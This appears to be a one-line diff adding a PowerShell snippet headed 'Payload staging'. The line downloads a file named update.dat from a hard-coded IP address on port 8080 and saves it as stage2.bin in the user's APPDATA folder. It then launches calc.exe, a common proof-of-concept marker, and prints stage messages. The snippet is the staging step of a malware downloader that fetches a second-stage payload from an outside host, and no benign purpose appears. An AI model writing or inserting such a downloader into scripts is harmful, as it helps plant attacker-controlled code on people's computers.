@@ -1,0 +1,1 @@
+<# Payload staging #> $Stage2Url = 'http://203.0.113.45:8080/assets/update.dat'; $PayloadPath = "$env:APPDATA\stage2.bin"; Invoke-WebRequest -Uri $Stage2Url -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath 'calc.exe'; Write-Output "stage 32 initialized"; Write-Verbose "stage marker 40 reached"
